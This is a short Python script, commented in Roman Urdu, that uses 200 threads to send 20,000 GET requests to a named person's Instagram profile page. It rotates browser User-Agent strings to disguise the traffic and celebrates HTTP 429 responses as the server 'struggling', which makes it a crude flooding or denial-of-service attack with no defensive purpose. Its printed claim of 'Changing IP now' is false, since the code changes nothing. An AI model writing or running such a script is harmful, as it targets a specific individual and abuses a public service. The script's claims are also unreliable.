import requests
import concurrent.futures
import random

target = "ruhan_kazmi_1122"

# Mukhtalif browsers ka dhoka dene ke liye
u_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36"
]

def heavy_attack(i):
    header = {"User-Agent": random.choice(u_agents)}
    try:
        r = requests.get(f"https://www.instagram.com/{target}/", headers=header, timeout=5)
        if r.status_code == 429:
            print(f"🔥 POWER HIT {i}: Server is struggling!")
        else:
            print(f"⚡ Signal {i}: Full Power Hit...")
    except:
        print("❌ Blocked! Changing IP now...")

# 200 workers ka matlab hai aik sath 200 hits!
with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
    executor.map(heavy_attack, range(1, 20000))

